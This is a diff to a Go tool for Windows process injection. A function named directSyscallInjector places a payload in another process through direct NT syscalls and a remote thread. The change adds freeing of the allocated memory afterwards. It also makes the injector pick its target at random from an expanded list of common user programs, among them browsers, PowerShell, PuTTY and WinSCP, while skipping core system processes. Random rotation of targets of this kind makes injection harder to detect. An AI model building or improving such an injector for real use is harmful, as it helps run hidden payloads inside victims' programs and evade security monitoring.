@@ -6,6 +6,7 @@ import (
 	"flag"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
 	"os"
 	"sort"
@@ -434,6 +435,24 @@ func directSyscallInjector(payload []byte, pid uint32) error {
 	// Close the thread handle
 	winapi.NtClose(hThread)
 
+	// Clean up allocated memory to prevent memory leaks
+	fmt.Printf("Cleaning up allocated memory...\n")
+	freeSize := uintptr(0) // Set to 0 to free the entire region
+	status, err = winapi.NtFreeVirtualMemory(
+		processHandle,
+		&remoteBuffer,
+		&freeSize,
+		winapi.MEM_RELEASE,
+	)
+	
+	if err != nil {
+		fmt.Printf("Warning: NtFreeVirtualMemory error: %v\n", err)
+	} else if status == winapi.STATUS_SUCCESS {
+		fmt.Printf("Memory freed successfully: %s\n", winapi.FormatNTStatus(status))
+	} else {
+		fmt.Printf("Memory free returned: %s\n", winapi.FormatNTStatus(status))
+	}
+
 	return nil
 }
 
@@ -619,31 +638,39 @@ func main() {
 	var selectedProcess ProcessInfo
 	
 	if *exampleFlag {
-		// Auto-select a safe process for example mode
-		safeProcesses := []string{"notepad.exe", "calc.exe", "mspaint.exe", "wordpad.exe", "write.exe"}
+		// Auto-select a safe process for example mode with rotation
+		safeProcesses := []string{"notepad.exe", "calc.exe", "mspaint.exe", "wordpad.exe", "write.exe", "onedrive.exe", "powershell.exe", "chrome.exe", "firefox.exe", "iexplore.exe", "msedge.exe", "code.exe", "notepad++.exe", "sublime_text.exe", "atom.exe", "putty.exe", "winscp.exe", "7zfm.exe", "winrar.exe", "vlc.exe", "wmplayer.exe"}
 		
-		// First try to find a known safe process
-		found := false
-		for _, safeProc := range safeProcesses {
-			for _, proc := range processes {
+		// Find all available safe processes
+		var availableSafeProcesses []ProcessInfo
+		for _, proc := range processes {
+			for _, safeProc := range safeProcesses {
 				if strings.EqualFold(proc.Name, safeProc) {
-					selectedProcess = proc
-					found = true
-					fmt.Printf("Auto-selected safe process: %s (PID: %d)\n", proc.Name, proc.Pid)
+					availableSafeProcesses = append(availableSafeProcesses, proc)
 					break
 				}
 			}
-			if found {
-				break
-			}
 		}
 		
-		// If no known safe process found, use the first non-system process
+		// If we found safe processes, randomly select one for rotation
+		found := false
+		if len(availableSafeProcesses) > 0 {
+			// Seed random number generator with current time for rotation
+			rand.Seed(time.Now().UnixNano())
+			selectedIndex := rand.Intn(len(availableSafeProcesses))
+			selectedProcess = availableSafeProcesses[selectedIndex]
+			found = true
+			fmt.Printf("Auto-selected safe process (rotated): %s (PID: %d) [%d/%d available]\n", 
+				selectedProcess.Name, selectedProcess.Pid, selectedIndex+1, len(availableSafeProcesses))
+		}
+		
+		// If no known safe process found, randomly select from non-system processes
 		if !found {
 			// Skip common system processes
 			systemProcesses := []string{"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe", 
 				"services.exe", "lsass.exe", "svchost.exe", "dwm.exe", "explorer.exe"}
 			
+			var nonSystemProcesses []ProcessInfo
 			for _, proc := range processes {
 				isSystem := false
 				for _, sysProc := range systemProcesses {
@@ -653,11 +680,17 @@ func main() {
 					}
 				}
 				if !isSystem {
-					selectedProcess = proc
-					found = true
-					fmt.Printf("Auto-selected process: %s (PID: %d)\n", proc.Name, proc.Pid)
-					break
+					nonSystemProcesses = append(nonSystemProcesses, proc)
 				}
+			}
+			
+			if len(nonSystemProcesses) > 0 {
+				rand.Seed(time.Now().UnixNano())
+				selectedIndex := rand.Intn(len(nonSystemProcesses))
+				selectedProcess = nonSystemProcesses[selectedIndex]
+				found = true
+				fmt.Printf("Auto-selected process (rotated): %s (PID: %d) [%d/%d available]\n", 
+					selectedProcess.Name, selectedProcess.Pid, selectedIndex+1, len(nonSystemProcesses))
 			}
 		}
 		
